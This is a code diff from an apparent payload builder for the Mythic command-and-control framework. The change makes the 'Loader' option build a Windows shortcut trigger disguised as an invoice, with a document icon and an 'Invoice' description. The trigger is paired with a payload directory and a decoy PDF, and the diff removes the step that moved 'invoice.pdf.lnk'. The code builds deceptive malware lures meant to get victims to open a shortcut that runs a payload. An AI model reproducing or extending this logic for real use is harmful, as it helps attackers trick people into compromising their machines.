@@ -1378,6 +1378,8 @@ generated if none have been entered.""",
             if self.get_parameter("0.0 Main Payload Type") == "Loader":
                 try:
                     payload_dir = Path(agent_build_path) / "payload"
+                    decoy_dir = Path(agent_build_path) / "decoys"
+                    decoy_file = decoy_dir / "decoy.pdf"
                     
                     # Create LNK trigger file
                     lnk_path = create_payload_trigger(
@@ -1386,21 +1388,19 @@ generated if none have been entered.""",
                         icon_src = r"C:\Windows\System32\imageres.dll",
                         icon_index = 0,
                         description = "Invoice",
+                        payload_dir = payload_dir,
+                        decoy_file = decoy_file
                     )
                     
-                    # Move invoice.pdf.lnk to payload directory
-                    lnk_source = Path(lnk_path)
-                    lnk_destination = payload_dir / "invoice.pdf.lnk"
-                    if lnk_source.exists():
-                        response.status = BuildStatus.Success
-                        response.build_message = "LNK Trigger created!"
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="Adding Trigger",
-                            StepStdout=f"LNK Trigger created at: {lnk_path}",
-                            StepSuccess=True,
-                        ))
+                    response.status = BuildStatus.Success
+                    response.build_message = "LNK Trigger created!"
+                    await SendMythicRPCPayloadUpdatebuildStep(
+                        MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Adding Trigger",
+                        StepStdout=f"LNK Trigger created at: {lnk_path}",
+                        StepSuccess=True,
+                    ))
                 except Exception as e:
                     response.status = BuildStatus.Error
                     response.build_message = f"Failed to create LNK trigger: {str(e)}"
